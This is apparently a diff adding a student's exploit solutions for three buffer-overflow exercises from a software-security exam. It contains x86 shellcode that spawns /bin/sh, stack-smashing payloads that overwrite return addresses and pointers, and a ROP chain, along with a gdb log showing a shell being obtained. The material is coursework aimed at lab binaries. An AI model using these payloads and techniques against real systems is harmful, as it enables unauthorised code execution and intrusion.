@@ -1,0 +1,121 @@
+
+############################# ES1
+#!/bin/bash
+
+# The main problem here is that a simple overflow is not easy
+# the 2 buffers have the same length, thus if a strcpy happens between the 2
+# while the one on the bottom overflows on the other one...
+# strcpy will overwrite "\0" during char to char copy
+# This will lead to a infinite copy until it get's stuck 
+# when encounters a zone in memory with all \x00
+ 
+# a BOF is still usefull cuz we will anyway overwrite the return address
+# it is just a little tricky to arrange the vector in a correct way,
+# to make it easy a section full of nops is usefull..
+
+SHELL_CODE="\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+RET="\x9c\xf2\xff\xbf"
+
+perl -e 'print "'$RET'"x4 . "\x90"x20 ."'$SHELL_CODE'"' | ./bof1
+
+# The exploit works : es1_gdb.log contains the session info...
+
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i586-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bof1...(no debugging symbols found)...done.
+(gdb) r < <(./77e7h
+Starting program: /home/student/Desktop/software-security-exam-master/January-2020-exam/bof-exercise/bof1 < <(./1.sh)
+process 4928 is executing new program: /bin/dash
+[Inferior 1 (process 4928) exited normally]
+(gdb) quits
+
+#------------------------------------ES2
+
+#!/bin/bash
+
+# Analizing the code i see i could overwrite the fp pointer.
+# In main fp is dereferenced and used for an assignement,
+# therefore i can use it to write on the debugging_disable variable
+
+# If that variable becomes 0, the "print_function" execute an unsafe strcpy
+# of src in dst[230] char array .
+
+# from disassembling print_funtion i get the "disable_security" location
+# and win func location
+
+# So i build the exploit with to overwrite fp wid SEC_LOC
+# I call the program with "0" as first argument
+# and i put WIN inside the vector to a proper position
+# counting the pad needed
+SEC_LOC="\x5c\x99\x04\x08"
+WIN="\x1b\x85\x04\x08"
+perl -e 'print "A"x230 . "'$WIN'"x2 ."B"x22 . "////"x2  . "'$SEC_LOC'"x1 '
+
+# this script prints the needed stdinput for the program
+# It worked inside and outside GDB
+
+./2.sh | ./bof2 0
+
+
+#-------------------------------------------ES3
+
+#!/usr/bin/python
+
+# The objective is to exec a command string 
+# One way to eploit the code is to overwrite de buf pointer
+# once with str1 and second with str2
+# each time we pass a piece of the command
+# "/bin" e "/bash" to str2 and str1 respectively
+# with ROP we cause to concat each of them with string
+# final step is a call to lazy to exec the string
+
+STR1="\x68\x99\x04\x08"
+STR2="\x64\x99\x04\x08"
+STRING="\x00\x99\x04\x08"
+
+# the 2 gets give us a chance to pass the command strings
+# we need to pay attention to the vector composition, very difficulti
+LAZY="\xce\x84\x04\x08"
+JOIN="\xbb\x84\x04\x08"
+# I need a pop pop ret to clean the stack at each join_string call
+P_P_RET="\x0e\x86\x04\x08"
+
+# exit to terminate in nice way
+EXIT="\x0b\xa1\xe4\xb7"
+
+# possible attack
+first_line = "/bash"+"A"*123+STR1
+second_line = "/bin"+"B"*17+"A"*128 + STR2 + "pad_"*2 +JOIN+P_P_RET+STRING+STR2+ JOIN+P_P_RET+STRING+STR1 + LAZY + EXIT
+
+# the 2 lines are separated by a \n to simulate 2 inputs
+
+if __name__ == '__main__':
+    print( first_line+ "\n" + second_line )
+
+# Explanation
+# the first_line writes /bash and puts str1 addr with a bof on buffer to buf
+# this triggers the strncpy call that copies "/bash" in str1 (5 chars)
+# last line does the same for "/bin" on str2 (4 chars)
+#  by BOF buffer1 -> buffer -> buf
+# the second line also contains a pad to reach the ret_addr
+# RET is overwritten with a call to join merging STR2 (/bin) on string
+# this triggers the call strncpy(buf, buffer1)
+# then a gadget to do a double POP and clean the stack
+# past in the attack vector the sequence is repeated for merging STR1 on STRING
+# Now string is initialized as we wanted
+# Now we add a ret to lazy (shell should spawn...)
+# finally a ret to EXIT of the libc to close the program nicely
+
+
